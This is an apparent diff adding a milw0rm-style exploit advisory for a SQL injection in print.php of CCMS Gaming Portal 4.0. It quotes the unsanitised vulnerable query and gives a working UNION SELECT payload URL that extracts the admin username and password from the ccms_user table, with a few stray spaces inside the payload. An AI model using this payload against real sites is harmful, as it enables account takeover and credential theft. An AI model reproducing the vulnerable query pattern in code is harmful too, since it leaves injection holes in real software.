@@ -1,0 +1,24 @@
+Author: ~!Dok_tOR!~
+Date found: 21.08.08
+Product: CCMS Gaming Portal
+Version: 4.0
+The price: $55
+URL: customcms.net
+Vulnerability Class: SQL injection
+
+print.php
+
+Vuln code:
+
+$q = mysql_query("SELECT * from ccms_news_comments WHERE w_id='$id'");
+
+
+magic_quotes_gpc = Off
+
+http://localhost/[installdir]/
+
+Exploit:
+
+print.php?id='+union+select+1,concat_ws(0x3a,usern ame,password),3,4,5,6,7,8,9,10,11,12,13,14,15,16,1 7,18,19,20,21+from+ccms_user+where+userid=1/*
+
+# milw0rm.com [2008-08-21]
